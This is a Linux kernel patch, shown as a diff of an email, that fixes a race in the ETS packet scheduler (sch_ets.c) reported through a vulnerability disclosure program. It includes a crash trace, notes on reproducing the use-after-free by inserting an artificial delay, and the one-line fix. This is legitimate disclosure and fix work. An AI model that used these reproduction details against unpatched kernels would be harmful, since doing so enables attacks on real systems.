+ rcu_core+0x7c0/0x1500 kernel/kernel/rcu/tree.c:2861
+ handle_softirqs+0x1ea/0x8a0 kernel/kernel/softirq.c:622
+ __do_softirq kernel/kernel/softirq.c:656
+[...]
 
+Commentary:
 
+1. Maher Azzouzi working with Trend Micro Zero Day Initiative was reported as
+the person who found the issue. I requested to get a proper email to add to the
+reported-by tag but got no response. For this reason i will credit the person
+i exchanged emails with i.e zdi-disclosures@trendmicro.com
+
+2. Neither i nor Victor who did a much more thorough testing was able to
+reproduce a UAF with the PoC or other approaches we tried. We were both able to
+reproduce a null ptr deref. After exchange with zdi-disclosures@trendmicro.com
+they sent a small change to be made to the code to add an extra delay which
+was able to simulate the UAF. i.e, this:
+   qdisc_put(q->classes[i].qdisc);
+   mdelay(90);
+   q->classes[i].qdisc = NULL;
+
+I was informed by Thomas Gleixner(tglx@linutronix.de) that adding delays was
+acceptable approach for demonstrating the bug, quote:
+"Adding such delays is common exploit validation practice"
+The equivalent delay could happen "by virt scheduling the vCPU out, SMIs,
+NMIs, PREEMPT_RT enabled kernel"
+
+3. I asked the OP to test and report back but got no response and after a
+few days gave up and proceeded to submit this fix.
+
+Fixes: de6d25924c2a ("net/sched: sch_ets: don't peek at classes beyond 'nbands'")
+Reported-by: zdi-disclosures@trendmicro.com
+Tested-by: Victor Nogueira <victor@mojatatu.com>
+Signed-off-by: Jamal Hadi Salim <jhs@mojatatu.com>
 ---
-If you want syzbot to run the reproducer, reply with:
-#syz test: git://repo/address.git branch-or-commit-hash
-If you attach or paste a git patch, syzbot will apply it before testing.
+ net/sched/sch_ets.c | 2 +-
+ 1 file changed, 1 insertion(+), 1 deletion(-)
+
+diff --git a/net/sched/sch_ets.c b/net/sched/sch_ets.c
+index 82635dd2cfa5..ae46643e596d 100644
+--- a/net/sched/sch_ets.c
++++ b/net/sched/sch_ets.c
+@@ -652,7 +652,7 @@ static int ets_qdisc_change(struct Qdisc *sch, struct nlattr *opt,
+ 	sch_tree_lock(sch);
+ 
+ 	for (i = nbands; i < oldbands; i++) {
+-		if (i >= q->nstrict && q->classes[i].qdisc->q.qlen)
++		if (cl_is_active(&q->classes[i]))
+ 			list_del_init(&q->classes[i].alist);
+ 		qdisc_purge_queue(q->classes[i].qdisc);
+ 	}
+-- 
+2.34.1
+
 
